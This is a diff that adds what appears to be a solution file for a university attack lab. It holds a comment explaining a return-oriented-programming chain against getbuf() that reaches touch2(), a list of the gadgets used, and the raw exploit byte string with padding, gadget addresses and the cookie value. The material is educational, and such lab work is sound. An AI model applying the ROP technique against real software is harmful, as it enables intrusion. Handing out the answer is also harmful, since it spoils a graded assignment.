@@ -1,0 +1,15 @@
+/*
+ * The address pointed by %rsp has been changed, but the offset to the return
+ * address of getbuf() is still 0x28. For an ROP, we only need to write down
+ * a sequence of return addresses (with some texts as arguments) and let the
+ * processor go to wherever we want.
+ *
+ * The cookie value (little-endian) should be inserted just after the address
+ * of the first gadget. And at last, don't forget to add the address of
+ * touch2()!
+ *
+ * List of exploited gadgets:
+ *   0x4019ab | 58 90 c3 | popq %rax; nop; ret
+ *   0x4019a2 | 48 89 c7 c3 | movq %rax %rdi; ret
+ */
+01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
